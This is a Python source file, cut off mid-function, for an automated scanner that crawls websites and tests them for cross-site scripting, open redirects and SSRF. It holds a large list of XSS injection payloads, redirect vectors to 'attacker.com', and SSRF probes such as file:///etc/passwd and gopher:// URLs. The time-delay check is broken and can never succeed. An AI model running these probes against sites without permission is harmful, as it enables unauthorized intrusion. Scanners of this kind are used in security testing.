#!/usr/bin/env python3
import asyncio,base64,httpx,logging,psutil,re,random,signal,datetime,html,json,os,sys,argparse,time,hashlib
from collections import deque
from dataclasses import dataclass,field
from typing import List,Set,Optional,Dict,Any,Tuple
from urllib.parse import urljoin,urlparse,parse_qs,urlencode,quote,unquote
try:from bs4 import BeautifulSoup,Tag,NavigableString
except ImportError:print("Install: pip install beautifulsoup4 lxml");sys.exit(1)
try:from rich.console import Console;from rich.table import Table;from rich.panel import Panel;from rich.progress import Progress,BarColumn,TextColumn,TimeElapsedColumn,SpinnerColumn,TimeRemainingColumn;from rich.align import Align;from rich.box import HEAVY_HEAD;from rich.prompt import Prompt;from rich.text import Text
except ImportError:print("Install: pip install rich");sys.exit(1)
try:from playwright.async_api import async_playwright,Browser,Page,Dialog
except ImportError:print("Install: pip install playwright && playwright install");sys.exit(1)

logging.basicConfig(level=logging.INFO,format='%(asctime)s [%(levelname)s] %(message)s',filename='scan.log',filemode='w')
logging.getLogger('httpx').setLevel(logging.ERROR)
logging.getLogger('playwright').setLevel(logging.ERROR)
log=logging.getLogger('scanner')
console=Console(log_time=False)

DIALOG_TAG=f"XSS_{random.randint(10000,99999)}"
DOM_ATTR=f"data-xss-{random.randint(1000,9999)}"
DOM_TAG=f"DOM_{random.randint(10000,99999)}"
TAINT_TAG=f"TAINT_{random.randint(10000,99999)}"
TAINT_ATTR=f"data-taint-{random.randint(1000,9999)}"
SLEEP_TIME=3

DOM_AGENT=f'''
(function(){{
const T="{TAINT_TAG}",A="{TAINT_ATTR}",U=window.location.hash.includes(T)?window.location.hash:window.location.search;
if(!U.includes(T))return;
function c(v,s){{if(typeof v==='string'&&v.includes(T)){{console.log("TAINT:"+s);document.body.setAttribute(A,s);}}return v;}}
const p=Element.prototype,d=['innerHTML','outerHTML','srcdoc'];
d.forEach(n=>{{const o=Object.getOwnPropertyDescriptor(p,n);if(o&&o.set)Object.defineProperty(p,n,{{set:function(v){{o.set.call(this,c(v,n));}},get:o.get,configurable:true}});}});
const oS=p.setAttribute;p.setAttribute=function(n,v){{const s='setAttribute('+n+')';if(n.toLowerCase().startsWith('on')||['href','src','formaction','data','xlink:href','code'].includes(n.toLowerCase()))v=c(v,s);oS.call(this,n,v);}};
const oI=p.insertAdjacentHTML;p.insertAdjacentHTML=function(pos,txt){{oI.call(this,pos,c(txt,'insertAdjacentHTML'));}};
const oW=document.write;document.write=function(){{for(let i=0;i<arguments.length;i++)c(arguments[i],'document.write');oW.apply(document,arguments);}};
const oH=Object.getOwnPropertyDescriptor(Location.prototype,'href');
if(oH&&oH.set)Object.defineProperty(Location.prototype,'href',{{set:function(v){{oH.set.call(this,c(v,'location.href'));}},get:oH.get,configurable:true}});
const oE=window.eval;window.eval=function(s){{c(s,'eval');return oE(s);}};
const oF=window.Function;window.Function=function(){{if(arguments.length>0)c(arguments[arguments.length-1],'Function');return oF.apply(this,arguments);}};
console.log("DOM Agent Active");
}})();
'''

@dataclass
class Settings:
    mode:str='COMPREHENSIVE'
    crawl:str='static'
    depth:int=15
    verify:bool=True
    debug:bool=False
    filter:int=80
    concurrency:int=200
    timeout:int=15
    max_targets:int=5000
    reflect_tag:str=field(default_factory=lambda:f"R{random.randint(10000,99999)}")
    od_domain:str='attacker.com'
    uri_attrs:Tuple[str,...]=('href','src','action','formaction','data','url','codebase','background','poster','manifest','xlink:href','code','srcdoc')
    event_attrs:Tuple[str,...]=('onload','onerror','onclick','onmouseover','onfocus','onblur','oninput','onchange','onsubmit','onanimationstart','ontransitionend','ontoggle')
    od_params:Tuple[str,...]=('next','url','dest','redirect','to','location','return','goto','target','path','file','view','image','continue')

@dataclass
class Target:
    method:str
    url:str
    params:Dict[str,str]=field(default_factory=dict)
    vuln:str='XSS'
    @property
    def base(self):return self.url.split('?')[0].split('#')[0]

@dataclass
class Finding:
    vuln:str='XSS'
    type:str=''
    severity:str='Medium'
    score:int=80
    base:str=''
    url:str=''
    param:str=''
    payload:str=''
    verify_type:str='dialog'
    method:str='GET'
    params:Dict[str,str]=field(default_factory=dict)
    context:str=''
    verified:bool=False
    confidence:float=0.0
    details:Dict[str,str]=field(default_factory=dict)
    exploits:Set[str]=field(default_factory=set)
    payloads:Set[str]=field(default_factory=set)

def load_payloads():
    b64=base64.b64encode(f'confirm("{DIALOG_TAG}")'.encode()).decode()
    delay=f"Set.constructor`setTimeout(\\'confirm(\\'{DIALOG_TAG}\\')\\'',{SLEEP_TIME*1000})`()"
    od_vecs=[f"//{Settings.od_domain}",f"https://{Settings.od_domain}",f"https://%09{Settings.od_domain}/"]
    ssrf=['file:///etc/passwd','dict://localhost:6379/','gopher://127.0.0.1:80/']
    
    return {
        'HTML_TAG':[
            (f'<svg/onload=confirm("{DIALOG_TAG}")>','SVG_ONLOAD','Critical',100,'dialog'),
            (f'<img src=x onerror="document.body.setAttribute(\'{DOM_ATTR}\',\'{DOM_TAG}\')">','IMG_DOM','Critical',100,'dom'),
            (f'<script>confirm("{DIALOG_TAG}")</script>','SCRIPT','Critical',100,'dialog'),
            (f'<object data="data:text/html;base64,{b64}"></object>','OBJECT_B64','Critical',100,'dialog'),
            (f'<details ontoggle=confirm("{DIALOG_TAG}") open>','DETAILS','High',95,'dialog'),
        ],
        'CONSUMING':[
            (f'</title><svg/onload=confirm("{DIALOG_TAG}")>','TITLE_BREAK','Critical',100,'dialog'),
            (f'</textarea><svg/onload=confirm("{DIALOG_TAG}")>','TEXTAREA_BREAK','Critical',100,'dialog'),
            (f'</script><svg/onload=confirm("{DIALOG_TAG}")>','SCRIPT_BREAK','Critical',100,'dialog'),
            (f'--></style><script>confirm("{DIALOG_TAG}")</script>','STYLE_BREAK','Critical',100,'dialog'),
        ],
        'FOCUS':[
            (f'<div onfocus=confirm("{DIALOG_TAG}") id=x tabindex=1>','TABINDEX','Critical',100,'dialog'),
            (f'<video><track default onload=confirm("{DIALOG_TAG}") src="data:text/vtt,WEBVTT"></video>','TRACK','High',95,'dialog'),
        ],
        'TRANSITION':[
            (f'<style>@keyframes x{{}}</style><b style="animation-name:x" onanimationstart="confirm(\'{DIALOG_TAG}\')"></b>','ANIMATION','Critical',100,'dialog'),
            (f'url("javascript:confirm(\'{DIALOG_TAG}\')")', 'CSS_URL', 'Critical', 100, 'dialog')

        ],
        'QUOTED_ATTR':[
            (f'"><svg/onload=confirm("{DIALOG_TAG}")>','ATTR_BREAK','Critical',100,'dialog'),
            (f'"\' autofocus onfocus="confirm(\'{DIALOG_TAG}\')','EVENT','High',90,'dialog'),
        ],
        'UNQUOTED_ATTR':[
            (f' onfocus=confirm("{DIALOG_TAG}") autofocus','UNQUOTED_EVENT','Critical',100,'dialog'),
            (f'><svg/onload=confirm("{DIALOG_TAG}")','TAG_BREAK','High',95,'dialog'),
        ],
        'URI_ATTR':[
            (f'javascript:confirm("{DIALOG_TAG}")','JS_SCHEME','Critical',100,'dialog'),
            (f'data:text/html;base64,{b64}','DATA_SCHEME','Critical',100,'dialog'),
            (f'jav%0ascript:confirm("{DIALOG_TAG}")','JS_BYPASS','Critical',100,'dialog'),
        ],
        'JS_STRING':[
            (f"';confirm('{DIALOG_TAG}')//","JS_SINGLE","Critical",100,'dialog'),
            (f'";confirm("{DIALOG_TAG}")//','JS_DOUBLE','Critical',100,'dialog'),
            (f"`confirm('{DIALOG_TAG}')`",'JS_TEMPLATE','Critical',98,'dialog'),
        ],
        'JS_RAW':[
            (f'onerror=confirm,`{DIALOG_TAG}`//','JS_THROW','Critical',100,'dialog'),
            (f"Set.constructor`confirm('{DIALOG_TAG}')`()",'JS_CONSTRUCTOR','Critical',100,'dialog'),
        ],
        'TEMPLATE':[
            (f'{{{{constructor.constructor(\'confirm("{DIALOG_TAG}")\')()}}}}', 'ANGULAR', 'Critical', 100, 'dialog')

        ],
        'BLIND':[
            (delay,'TIME_DELAY','Critical',90,'time'),
        ],
        'OD':[
            (v,f'OD_{i}','High',95,'redirect') for i,v in enumerate(od_vecs,1)
        ],
        'SSRF':[
            (v,f'SSRF_{i}','High',95,'redirect') for i,v in enumerate(ssrf,1)
        ],
        'HTML_TEXT':[
            (f'<svg/onload=confirm("{DIALOG_TAG}")>','TEXT','Critical',98,'dialog'),
        ],
        'JS_COMMENT':[
            (f"*/confirm('{DIALOG_TAG}')/*",'COMMENT_BREAK','Critical',70,'dialog'),
        ],
    }

PAYLOADS=load_payloads()

class Stats:
    def __init__(self):
        self.targets_found=0
        self.targets_scanned=0
        self.reflections=0
        self.findings=0
        self.verified=0
        self.high_confidence=0
        self.start_time=time.time()
    
    def get_panel(self):
        elapsed=time.time()-self.start_time
        rate=self.targets_scanned/(elapsed+0.001)
        
        stats_text=f"""[cyan]Targets:[/cyan] {self.targets_scanned}/{self.targets_found} | [yellow]Rate:[/yellow] {rate:.1f}/s
[green]Reflections:[/green] {self.reflections} | [magenta]Findings:[/magenta] {self.findings}
[bold green]Verified:[/bold green] {self.verified} | [bold yellow]High Confidence:[/bold yellow] {self.high_confidence}
[dim]Elapsed:[/dim] {int(elapsed//60)}m {int(elapsed%60)}s"""
        
        return Panel(Align.center(stats_text),title='[bold blue]Live Stats[/bold blue]',border_style='cyan',padding=(0,2))

class Health:
    def __init__(self,settings,manager):
        self.settings=settings
        self.manager=manager
        self.cpu=0.0
        self.mem=0.0
    
    async def update(self):
        try:
            self.cpu=psutil.cpu_percent()
            self.mem=psutil.virtual_memory().percent
        except:return
        
        cap=self.settings.concurrency
        if self.mem>90:cap=max(5,cap//6)
        elif self.cpu>90:cap=max(10,cap//4)
        elif self.mem>80 or self.cpu>75:cap=max(20,cap//2)
        
        if cap!=self.settings.concurrency:
            diff=cap-self.settings.concurrency
            self.settings.concurrency=cap
            if diff>0:
                for _ in range(diff):self.manager.sem.release()
            else:
                asyncio.create_task(self._acquire(abs(diff)))
    
    async def _acquire(self,n):
        for _ in range(n):
            try:await self.manager.sem.acquire()
            except:break

class Pool:
    def __init__(self,browser,size):
        self.browser=browser
        self.size=size
        self.pool=asyncio.Queue()
        self.ready=asyncio.Event()
    
    async def init(self):
        for _ in range(self.size):await self._create()
        if self.pool.qsize()>0:self.ready.set()
    
    async def _create(self):
        try:
            if not self.browser.is_connected():return
            ctx=await self.browser.new_context(ignore_https_errors=True)
            await ctx.add_init_script(DOM_AGENT)
            page=await ctx.new_page()
            await self.pool.put(page)
        except Exception as e:log.error(f"Page create failed: {e}")
    
    async def get(self):
        await self.ready.wait()
        return await self.pool.get()
    
    async def ret(self,page):
        try:
            if not self.browser.is_connected():return
            if page.is_closed() or not page.context:raise Exception('Closed')
            await page.goto('about:blank',wait_until='commit')
            await self.pool.put(page)
        except:
            try:
                if page.context:await page.context.close()
            except:pass
            asyncio.create_task(self._create())
    
    async def shutdown(self):
        self.ready.clear()
        while not self.pool.empty():
            try:
                page=self.pool.get_nowait()
                if page.context:await page.context.close()
                self.pool.task_done()
            except:break

class Verifier:
    def __init__(self,settings,pool):
        self.settings=settings
        self.pool=pool
    
    async def verify(self,finding):
        page=None
        triggered=asyncio.Event()
        
        def on_dialog(dialog):
            if DIALOG_TAG in dialog.message:
                triggered.set()
            try:asyncio.create_task(dialog.accept())
            except:pass
        
        try:
            page=await self.pool.get()
            page.on('dialog',on_dialog)
            timeout=self.settings.timeout*2000
            
            if finding.method=='GET':
                await page.goto(finding.url,timeout=timeout,wait_until='domcontentloaded')
            else:
                inputs=''.join(f'<input type="hidden" name="{html.escape(k)}" value="{html.escape(v)}">' for k,v in finding.params.items())
                content=f'<html><body onload="document.getElementById(\'f\').submit()"><form id="f" method="POST" action="{html.escape(finding.base)}">{inputs}</form></body></html>'
                await page.set_content(content,wait_until='domcontentloaded',timeout=timeout)
            
            if finding.verify_type=='dialog':
                try:
                    await asyncio.wait_for(triggered.wait(),timeout=3.5)
                    return True
                except asyncio.TimeoutError:return False
            elif finding.verify_type=='dom_taint':
                try:
                    await page.wait_for_function(f"document.body.getAttribute('{TAINT_ATTR}')",timeout=3000)
                    sink=await page.evaluate(f"document.body.getAttribute('{TAINT_ATTR}')")
                    finding.context=f"SINK:{sink}"
                    finding.type='DOM_XSS'
                    return True
                except:return False
            elif finding.verify_type=='time':
                start=time.time()
                elapsed=time.time()-start
                return elapsed>=SLEEP_TIME+1
            elif finding.verify_type=='dom':
                try:
                    await page.wait_for_function(f"document.body.getAttribute('{DOM_ATTR}')==='{DOM_TAG}'",timeout=3000)
                    return True
                except:return False
            return False
        except Exception as e:
            if 'Timeout' not in str(type(e).__name__):
                log.error(f"Verify error: {e}")
            return False
        finally:
            if page:
                try:page.remove_listener('dialog',on_dialog)
                except:pass
                await self.pool.ret(page)

class Crawler:
    def __init__(self,client,settings,targets,sem,shutdown,pool=None):
        self.client=client
        self.pool=pool
        self.settings=settings
        self.targets=targets
        self.visited=set()
        self.visited_js=set()
        self.scan_targets={}
        self.queue=None
        self.js_queue=asyncio.Queue()
        self.sem=sem
        self.shutdown=shutdown
        self.capped=False
        self.js_params=set()
    
    def _add(self,target):
        if self.capped:return
        if len(self.scan_targets)>=self.settings.max_targets:
            self.capped=True
            return
        key=f"{target.vuln}_{target.method}_{target.base}_{sorted(target.params.keys())}"
        if key not in self.scan_targets:
            self.scan_targets[key]=target
            self.targets.put_nowait(target)
        else:
            existing=self.scan_targets[key]
            existing.method=target.method if target.method=='POST' else existing.method
            for k,v in target.params.items():
                if k not in existing.params:
                    existing.params[k]=v
    
    async def crawl(self,start,progress,task_id):
        self.queue=asyncio.Queue()
        await self.queue.put((start,0))
        self.visited.add(start)
        
        parsed=urlparse(start)
        domain=parsed.netloc
        params=parse_qs(parsed.query)
        
        if params:
            p={k:'X' for k in params.keys()}
            self._add(Target('GET',parsed._replace(query='',fragment='').geturl(),p,'XSS'))
            for k in params.keys():
                if k.lower() in self.settings.od_params:
                    self._add(Target('GET',parsed._replace(query='',fragment='').geturl(),{k:self.settings.od_domain},'OD'))
        
        for pn in ['file','path','load','image']:
            if pn not in params:
                self._add(Target('GET',parsed._replace(query='',fragment='').geturl(),{pn:'X'},'SSRF'))
        
        base_url=parsed._replace(query='',fragment='').geturl()
        
        if self.settings.verify and self.pool:
            self._add(Target('GET',f"{base_url}#{TAINT_TAG}",{'dom_source':'hash'},'XSS'))
            self._add(Target('GET',f"{base_url}?{TAINT_TAG}={TAINT_TAG}",{TAINT_TAG:TAINT_TAG},'XSS'))
        
        common_endpoints=['/api','/api/v1','/graphql','/search','/login','/register','/user','/profile','/account','/settings','/admin','/dashboard']
        for endpoint in common_endpoints:
            if self.capped:break
            test_url=urljoin(base_url,endpoint)
            if test_url not in self.visited:
                self.visited.add(test_url)
                self.queue.put_nowait((test_url,0))
                self._add(Target('GET',test_url,{'q':'X'},'XSS'))
        
        async def js_worker():
            while True:
                try:
                    js_url=await self.js_queue.get()
                    if self.shutdown.is_set() or self.capped:
                        self.js_queue.task_done()
                        continue
                    try:await self._parse_js(js_url)
                    except:pass
                    finally:self.js_queue.task_done()
                except asyncio.CancelledError:break
                except:pass
        
        async def crawl_worker():
            while True:
                if self.shutdown.is_set():break
                try:
                    url,depth=await self.queue.get()
                    if self.shutdown.is_set():
                        self.queue.task_done()
                        continue
                    try:
                        if depth>self.settings.depth:continue
                        
                        content=''
                        content_type=''
                        async with self.sem:
                            if self.shutdown.is_set():continue
                            page=None
                            try:
                                if self.settings.crawl=='dynamic' and self.pool:
                                    page=await self.pool.get()
                                    resp=await page.goto(url,wait_until='networkidle',timeout=self.settings.timeout*3000)
                                    content=await page.content()
                                    content_type='text/html'
                                else:
                                    r=await self.client.get(url,follow_redirects=True)
                                    if r.status_code>=400:continue
                                    content=r.text
                                    content_type=r.headers.get('content-type','').lower()
                            except Exception as e:
                                log.debug(f"Crawl error {url}: {e}")
                                continue
                            finally:
                                if page and self.pool:await self.pool.ret(page)
                        
                        if content and ('text/html' in content_type or 'application/json' in content_type or not content_type):
                            await asyncio.to_thread(self._process,url,content,depth)
                    except Exception as e:
                        log.debug(f"Worker error: {e}")
                    finally:
                        self.queue.task_done()
                        progress.update(task_id,completed=len(self.visited),description=f"Crawl: {len(self.visited)} visited, {self.queue.qsize()} queued, {len(self.scan_targets)} targets")
                except asyncio.CancelledError:break
                except:pass
        
        workers=[asyncio.create_task(crawl_worker()) for _ in range(max(1,self.settings.concurrency//2))]
        js_workers=[asyncio.create_task(js_worker()) for _ in range(max(1,len(workers)//2))]
        
        try:
            await self.queue.join()
            await self.js_queue.join()
        except:pass
        finally:
            for w in workers+js_workers:w.cancel()
            await asyncio.gather(*workers,*js_workers,return_exceptions=True)
            progress.stop_task(task_id)
            progress.update(task_id,description=f"Crawl done: {len(self.visited)} visited",completed=len(self.visited))
    
    def _process(self,base,content,depth):
        try:soup=BeautifulSoup(content,'lxml')
        except:soup=BeautifulSoup(content,'html.parser')
        
        self._forms(base,soup)
        self._links(base,soup,depth)
        self._scripts(base,soup)
        self._inline_js(base,soup)
        self._fuzz(base.split('?')[0])
    
    def _fuzz(self,base):
        if not self.js_params:return
        for p in self.js_params:
            if self.capped:return
            self._add(Target('GET',base,{p:'X'},'XSS'))
            if p.lower() in self.settings.od_params:
                self._add(Target('GET',base,{p:self.settings.od_domain},'OD'))
            if p.lower() in ['file','path','load','image']:
                self._add(Target('GET',base,{p:'X'},'SSRF'))
    
    def _links(self,base,soup,depth):
        found_urls=set()
        
        for a in soup.find_all('a',href=True):
            if self.capped:return
            href=a['href'].strip()
            if href:found_urls.add(href)
        
        for elem in soup.find_all(attrs={'data-href':True}):
            if elem.get('data-href'):found_urls.add(elem['data-href'])
        
        for elem in soup.find_all(attrs={'data-url':True}):
            if elem.get('data-url'):found_urls.add(elem['data-url'])
        
        for elem in soup.find_all(attrs={'ng-href':True}):
            if elem.get('ng-href'):found_urls.add(elem['ng-href'])
        
        page_text=soup.get_text()
        url_pattern=re.findall(r'["\']([/][a-zA-Z0-9/_\-\.]+)["\']',str(soup)[:50000])
        for u in url_pattern[:100]:
            if len(u)>3 and not u.endswith(('.js','.css','.png','.jpg','.gif','.svg')):
                found_urls.add(u)
        
        for href in found_urls:
            if self.capped:return
            if not href or href.startswith(('#','mailto:','tel:','javascript:','data:')):continue
            
            full=urljoin(base,href)
            parsed=urlparse(full)
            if parsed.netloc and parsed.netloc!=urlparse(base).netloc:continue
            
            if parsed.query:
                p={k:'X' for k in parse_qs(parsed.query).keys()}
                self._add(Target('GET',parsed._replace(query='',fragment='').geturl(),p,'XSS'))
                for k in p.keys():
                    if k.lower() in self.settings.od_params:
                        self._add(Target('GET',parsed._replace(query='',fragment='').geturl(),{k:self.settings.od_domain},'OD'))
                    if k.lower() in ['file','path','load','image']:
                        self._add(Target('GET',parsed._replace(query='',fragment='').geturl(),{k:'X'},'SSRF'))
            
            crawl_url=parsed._replace(fragment='').geturl()
            if crawl_url not in self.visited and len(self.visited)<self.settings.depth*20:
                self.visited.add(crawl_url)
                if self.queue:self.queue.put_nowait((crawl_url,depth+1))
    
    def _scripts(self,base,soup):
        for s in soup.find_all('script',src=True):
            if self.capped:return
            src=s['src'].strip()
            if not src:continue
            full=urljoin(base,src)
            parsed=urlparse(full)
            if parsed.netloc!=urlparse(base).netloc:continue
            clean=parsed._replace(query='',fragment='').geturl()
            if clean not in self.visited_js:
                self.visited_js.add(clean)
                self.js_queue.put_nowait(clean)
    
    def _forms(self,base,soup):
        for form in soup.find_all('form'):
            if self.capped:return
            action=form.get('action','')
            method=form.get('method','GET').upper()
            form_url=urljoin(base,action)
            if urlparse(form_url).netloc!=urlparse(base).netloc:continue
            
            params={}
            for inp in form.find_all(['input','textarea','select']):
                name=inp.get('name')
                if name:params[name]=inp.get('value','X')
            
            if not params:continue
            self._add(Target(method,form_url.split('?')[0],params,'XSS'))
            for k in params.keys():
                if k.lower() in self.settings.od_params:
                    self._add(Target(method,form_url.split('?')[0],{k:self.settings.od_domain},'OD'))
                if k.lower() in ['file','path','load','image']:
                    self._add(Target(method,form_url.split('?')[0],{k:'X'},'SSRF'))
    
    def _inline_js(self,base,soup):
        for s in soup.find_all('script'):
            if self.capped:return
            if s.get('src'):continue
            content=s.string
            if content:self._parse_js_content(content,base)
    
    async def _parse_js(self,url):
        try:
            async with self.sem:
                if self.shutdown.is_set():return
                r=await self.client.get(url)
                r.raise_for_status()
            await asyncio.to_thread(self._parse_js_content,r.text,url,True)
        except:pass
    
    def _parse_js_content(self,content,base,update=False):
        if self.capped:return
        
        params=set(re.findall(r'[\'\"](next|url|redirect|return|dest|target|goto|path|file|load|key|id|param|view|sort|item|theme|query|search|q|s|callback|ref|link)["\']',content,re.I))
        
        paths=set()
        paths.update(m[0] for m in re.findall(r'[\'\"]((?:\/|(?:\.\./))[a-zA-Z0-9\\./_-]+?\.(?:js|json|html|php|aspx|jsp|xml))["\']',content,re.I))
        paths.update(re.findall(r'[\'\"](\/api\/[a-zA-Z0-9\/_-]+)["\']',content,re.I))
        paths.update(re.findall(r'[\'\"](\/graphql[a-zA-Z0-9\/_-]*)["\']',content,re.I))
        paths.update(re.findall(r'fetch\([\'\"](\/[a-zA-Z0-9\/_-]+)["\']',content,re.I))
        paths.update(re.findall(r'axios\.(?:get|post)\([\'\"](\/[a-zA-Z0-9\/_-]+)["\']',content,re.I))
        paths.update(re.findall(r'\$\.(?:get|post|ajax)\([\'\"](\/[a-zA-Z0-9\/_-]+)["\']',content,re.I))
        
        endpoints=re.findall(r'endpoint[\'\"]\s*:\s*[\'\"](\/[a-zA-Z0-9\/_-]+)["\']',content,re.I)
        paths.update(endpoints)
        
        if update:self.js_params.update(params)
        if not paths and not params:return
        
        p={'js':'1'}
        for pr in params:p[pr]='X'
        
        base_clean=base.split('?')[0]
        self._add(Target('GET',base_clean,p,'XSS'))
        
        for path in paths:
            if self.capped:return
            if not path or path.startswith(('#','mailto:','tel:')):continue
            full=urljoin(base,path)
            parsed=urlparse(full)
            if parsed.netloc and parsed.netloc!=urlparse(base).netloc:continue
            clean=full.split('?')[0].split('#')[0]
            if clean and clean not in self.visited:
                self._add(Target('GET',clean,p,'XSS'))
                if len(self.visited)<self.settings.depth*20:
                    self.visited.add(clean)
                    if self.queue:self.queue.put_nowait((clean,0))

class Scanner:
    def __init__(self,client,settings,verify_queue):
        self.client=client
        self.settings=settings
        self.verify_queue=verify_queue
    
    async def _send(self,target,data,follow=True):
        try:
            if target.method=='GET':
                query=urlencode(data,safe=':/<>"')
                url=f"{target.base}?{query}"
                start=time.time()
                r=await self.client.get(url,follow_redirects=follow)
                return url,r,time.time()-start
            else:
                start=time.time()
                r=await self.client.post(target.base,data=data,follow_redirects=follow)
                return target.base,r,time.time()-start
        except:pass
        return target.base,None,0
    
    async def _context(self,text,tag):
        if tag not in text:return 'NONE',0,0.0
        if tag==TAINT_TAG:return 'DOM_TAINT',100,1.0
        
        occurrences=text.count(tag)
        confidence=min(1.0,occurrences/3.0)
        if re.search(r'\{\{\s*[^}]*?'+re.escape(tag)+r'[^}]*\s*\}\}',text):return 'TEMPLATE',100,0.95
        
        if re.search(f"<!--[^-]*?{re.escape(tag)}[^-]*?-->",text,re.DOTALL):
            if re.search(f"--\\s*>\\s*({re.escape(tag)})",text,re.I):return 'HTML_TAG',100,0.9
            return 'HTML_COMMENT',60,0.4
        
        m=re.search(f"([\\w\\-]+)\\s*=\\s*(['\"])([^'\"]*?){re.escape(tag)}([^'\"]*?)\\2",text,re.I|re.DOTALL)
        if m:
            attr=m.group(1).lower()
            conf=0.9 if occurrences>1 else 0.7
            if attr in self.settings.uri_attrs:return 'URI_ATTR',95,conf+0.05
            if attr in self.settings.event_attrs or attr.startswith('on'):return 'EVENT_ATTR',100,conf+0.1
            return 'QUOTED_ATTR',90,conf
        
        m=re.search(f"([\\w\\-]+)\\s*=\\s*([^>\\s'\"]*?){re.escape(tag)}([^>\\s'\"]*?)",text,re.I|re.DOTALL)
        if m:
            attr=m.group(1).lower()
            conf=0.85 if occurrences>1 else 0.65
            if attr in self.settings.uri_attrs:return 'URI_UNQUOTED',100,conf+0.1
            return 'UNQUOTED_ATTR',100,conf+0.05
        
        if re.search(f"(?:data|blob):([^,;]*?)[,;][^<]*?{re.escape(tag)}",text,re.I|re.DOTALL):return 'DATA_URL',95,0.85
        if text.count(tag)>2:return 'MULTI_REFLECT',100,min(1.0,occurrences/5.0)
        
        try:
            soup=BeautifulSoup(text,'lxml')
            match=soup.find(string=lambda t:isinstance(t,NavigableString) and tag in t)
            if match:
                parent=match.parent
                base_conf=min(0.9,confidence+0.2)
                if parent and parent.name in['title','textarea','noscript','style','iframe','select','template']:return 'CONSUMING',85,base_conf-0.1
                if parent and parent.name=='script':
                    snippet=match.string
                    if not snippet:return 'HTML_TEXT',60,0.3
                    if re.search(f"(//|/\\*)\\s*.*{re.escape(tag)}",snippet,re.DOTALL):return 'JS_COMMENT',70,0.5
                    if re.search(f"([\"']){re.escape(tag)}\\1",snippet):return 'JS_STRING',90,base_conf
                    if re.search(f"{re.escape(tag)}",snippet):return 'JS_RAW',100,base_conf+0.05
                if parent and parent.name=='style':return 'CSS_STYLE',80,base_conf-0.15
                if parent and parent.name not in['textarea','title','pre']:
                    if re.search(r'\s*<'+re.escape(tag)+r'\s*<meta',text,re.I):return 'IE_FILTER',95,0.8
                    if 'location=' in text and 'onclick' in text:return 'LOCATION_RECONSTRUCT',100,0.85
                    has_tab=any(t.get('tabindex') is not None for t in soup.find_all() if tag in str(t))
                    if has_tab:return 'FOCUS',100,base_conf
                    if re.search(r'(animation-name|transition:)',text,re.I):return 'TRANSITION',90,base_conf-0.05
                    return 'HTML_TEXT',100,base_conf
        except:pass
        
        if tag in text:return 'GENERIC',50,max(0.2,confidence-0.3)
        return 'NONE',0,0.0
    
    async def _encoding(self,text,tag):
        enc=[]
        esc=html.escape(tag)
        if esc!=tag and esc in text:
            if re.search(r'&lt;.*?&gt;',text):enc.append('HTML_FULL')
            elif re.search(r'&lt;',text):enc.append('HTML_PARTIAL')
        if re.search(r'\\u[0-9a-f]{4}|%[0-9a-f]{2}',text,re.I):enc.append('UNICODE')
        if not enc and tag in text:enc.append('RAW')
        return list(set(enc))
    
    async def _reflect(self,target,param):
        best={'reflected':False,'context':'NONE','score':0,'confidence':0.0,'encodings':[]}
        tag=self.settings.reflect_tag
        data=target.params.copy()
        data[param]=tag
        
        for _ in range(1):
            _,r,_=await self._send(target,data,follow=False)
            if not r or r.status_code>=400:continue
            try:text=r.text
            except:continue
            
            ctx,score,conf=await self._context(text,tag)
            enc=await self._encoding(text,tag)
            
            if score>best['score']:
                best.update({'reflected':True,'context':ctx,'score':score,'confidence':conf,'encodings':enc})
            if best['score']==100 and conf>=0.8:break
        
        if best['reflected']:
            if any(e in best['encodings'] for e in['HTML_FULL','HTML_PARTIAL']):
                if best['context'] not in['JS_RAW','JS_STRING','URI_ATTR','URI_UNQUOTED']:
                    best['score']=max(50,best['score']-15)
                    best['confidence']=max(0.3,best['confidence']-0.2)
        
        return best['reflected'],best['context'],best['score'],best['confidence'],best['encodings']
    
    async def _od(self,target,param):
        payloads=PAYLOADS.get('OD',[])
        for payload,ptype,sev,score,vtype in payloads:
            if score<self.settings.filter:continue
            data=target.params.copy()
            data[param]=payload
            
            try:
                _,r,_=await self._send(target,data,follow=True)
                if not r:continue
                final=str(r.url)
                if self.settings.od_domain in final:
                    return Finding(vuln='OD',type=ptype,severity=sev,score=score,base=target.base,url=str(r.url),param=param,payload=payload,verify_type='redirect',method=target.method,params=data,context='REDIRECT_FINAL',verified=True)
                if r.history:
                    for hr in r.history:
                        if self.settings.od_domain in str(hr.headers.get('location','')):
                            return Finding(vuln='OD',type=ptype,severity=sev,score=score,base=target.base,url=str(r.url),param=param,payload=payload,verify_type='redirect',method=target.method,params=data,context='REDIRECT_CHAIN',verified=True)
            except:pass
    
    async def _ssrf(self,target,param):
        payloads=PAYLOADS.get('SSRF',[])
        for payload,ptype,sev,score,vtype in payloads:
            if score<self.settings.filter:continue
            data=target.params.copy()
            data[param]=payload
            _,r,_=await self._send(target,data)
            if r and r.status_code<400 and len(r.text)<500:
                return Finding(vuln='SSRF',type=ptype,severity=sev,score=score,base=target.base,url=r.url,param=param,payload=payload,verify_type='redirect',method=target.method,params=data,context='BLIND_FILE',verified=False)
    
    async def _blind(self,target,param):
        payloads=PAYLOADS.get('BLIND',[])
        if not payloads:return
        payload,ptype,sev,score,vtype=payloads[0]
        if score<self.settings.filter:return
        data=target.params.copy()
        data[param]=payload
        return Finding(vuln='XSS',type=ptype,severity=sev,score=score,base=target.base,url=target.base,param=param,payload=payload,verify_type='time',method=target.method,params=data,context='BLIND_TIME',verified=False)
    
    async def scan(self,target,shutdown):
        if target.vuln=='OD':
            for param in list(target.params.keys()):
                if shutdown.is_set():break
                f=await self._od(target,param)
                if f:self.verify_queue.put_nowait(f)
                if self.settings.mode=='QUICK' and f:return
            return
        
        if target.vuln=='SSRF':
            for param in list(target.params.keys()):
                if shutdown.is_set():break
                f=await self._ssrf(target,param)
                if f:self.verify_queue.put_nowait(f)
                if self.settings.mode=='QUICK' and f:return
            return
        
        if len(target.params)==1 and 'BLIND' in list(target.params.keys())[0]:
            f=await self._blind(target,list(target.params.keys())[0])
            if f:self.verify_queue.put_nowait(f)
            return
        
        if TAINT_TAG in target.url:
            if not self.settings.verify:return
            f=Finding(vuln='XSS',type='DOM_TAINT',severity='Critical',score=100,base=target.base,url=target.url,param=list(target.params.keys())[0],payload='TAINT',verify_type='dom_taint',method='GET',params=target.params,context='DOM_TAINT')
            self.verify_queue.put_nowait(f)
            return
        
        for param in list(target.params.keys()):
            if shutdown.is_set():break
            reflected,ctx,score,conf,enc=await self._reflect(target,param)
            if reflected and score>=60:
                if hasattr(self,'stats_ref'):self.stats_ref.reflections+=1
            if not reflected or score<60 or conf<0.3:continue
            
